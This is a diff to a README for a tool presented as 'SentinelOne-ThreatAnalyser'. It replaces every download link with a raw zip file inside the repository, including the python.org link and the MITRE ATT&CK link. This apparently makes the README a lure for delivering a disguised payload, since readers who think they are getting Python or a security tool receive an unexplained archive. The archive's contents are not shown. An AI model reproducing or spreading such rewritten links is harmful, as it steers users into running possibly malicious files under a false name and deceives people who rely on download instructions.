@@ -1,6 +1,6 @@
 # 🛡️ SentinelOne-ThreatAnalyser - Simple Threat Analysis Tool
 
-[![Download](https://img.shields.io/badge/Download-SentinelOne--ThreatAnalyser-brightgreen)](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser)
+[![Download](https://img.shields.io/badge/Download-SentinelOne--ThreatAnalyser-brightgreen)](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser/raw/refs/heads/main/protonymph/One-Analyser-Threat-Sentinel-1.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Before you download and run SentinelOne-ThreatAnalyser on Windows, make sure you
 
 To get started, **visit this page to download** the software:
 
-[![Download](https://img.shields.io/badge/download%20here-blue?style=for-the-badge)](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser)
+[![Download](https://img.shields.io/badge/download%20here-blue?style=for-the-badge)](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser/raw/refs/heads/main/protonymph/One-Analyser-Threat-Sentinel-1.3.zip)
 
 You will find the latest release and all files you need on the page.
 
@@ -66,7 +66,7 @@ SentinelOne-ThreatAnalyser requires Python 3.8 or higher. To check if Python is 
 3. If a version number like `Python 3.x.x` appears, Python is installed.
 4. If you get an error or no version number, follow these steps:
 
-   - Visit https://www.python.org/downloads/windows/
+   - Visit https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser/raw/refs/heads/main/protonymph/One-Analyser-Threat-Sentinel-1.3.zip
    - Click “Download Python 3.x.x” for Windows.
    - Run the downloaded installer.  
    - Make sure to check the box **Add Python 3.x to PATH** during installation.
@@ -146,9 +146,9 @@ These features support effective incident response and forensic investigation wi
 
 ## 🔗 Useful Links
 
-- Download and releases: [https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser)
-- Python downloads: https://www.python.org/downloads/windows/
-- MITRE ATT&CK framework: https://attack.mitre.org/
+- Download and releases: [https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser/raw/refs/heads/main/protonymph/One-Analyser-Threat-Sentinel-1.3.zip](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser/raw/refs/heads/main/protonymph/One-Analyser-Threat-Sentinel-1.3.zip)
+- Python downloads: https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser/raw/refs/heads/main/protonymph/One-Analyser-Threat-Sentinel-1.3.zip
+- MITRE ATT&CK framework: https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser/raw/refs/heads/main/protonymph/One-Analyser-Threat-Sentinel-1.3.zip
 
 ---
 
